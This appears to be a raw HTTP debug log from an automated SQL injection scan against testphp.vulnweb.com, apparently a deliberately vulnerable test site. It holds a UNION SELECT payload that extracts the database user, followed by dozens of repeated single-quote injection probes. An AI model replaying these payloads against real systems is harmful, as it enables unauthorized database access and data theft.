DEBUG [2022-05-09 15:20:30,761] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:30,817] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:31,522] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:31,530] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:32,215] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:32,223] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:32,906] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:32,912] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:33,595] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:33,602] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:34,289] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:34,297] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:34,950] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:34,957] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:35,646] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:35,652] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:36,322] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:36,328] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:37,007] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:37,013] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:37,673] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:37,680] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:38,340] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:38,346] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:39,034] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:39,040] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:39,743] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:39,749] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:40,498] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:40,504] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:41,203] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:41,209] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:41,913] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:41,920] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:42,653] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:42,659] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:43,363] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:43,370] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:44,063] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:44,070] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:44,784] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:44,790] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:45,470] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:45,476] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:46,163] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:46,170] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:46,875] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:46,882] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:47,588] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:47,594] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:48,459] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:48,467] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:49,183] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:49,189] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:52,951] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:52,957] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:53,743] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:53,750] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:54,490] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:54,496] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:55,395] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:55,401] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:56,113] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:56,119] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:56,794] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:56,809] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:57,524] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:57,530] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:58,234] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:58,240] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:58,924] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:58,930] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:59,636] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:59,642] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:00,322] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:00,328] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:01,034] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:01,040] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:01,754] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:01,760] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:02,438] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:02,444] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:03,100] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:03,106] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:03,784] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:03,790] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:04,485] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:04,492] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:05,152] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:05,158] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:05,836] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:05,842] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:06,548] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:06,554] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:07,418] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:07,424] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:08,087] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:08,096] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:08,805] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:08,812] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:09,522] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:09,528] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:10,234] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:10,240] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:10,934] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:10,941] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:11,664] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:11,670] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:12,344] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:12,350] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:13,057] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:13,063] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:13,734] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:13,748] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:14,462] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:14,468] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:15,136] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:15,154] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:15,826] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:15,832] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:16,497] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:16,504] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:17,193] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:17,200] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:17,916] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:17,922] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:18,680] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:18,687] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:19,488] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:19,495] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:20,292] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:20,298] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:21,074] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:21,080] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:21,794] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:21,800] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:22,523] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:22,532] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:23,274] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:23,280] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:23,994] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:24,000] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:24,683] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:24,692] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:25,460] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:25,466] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:26,234] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
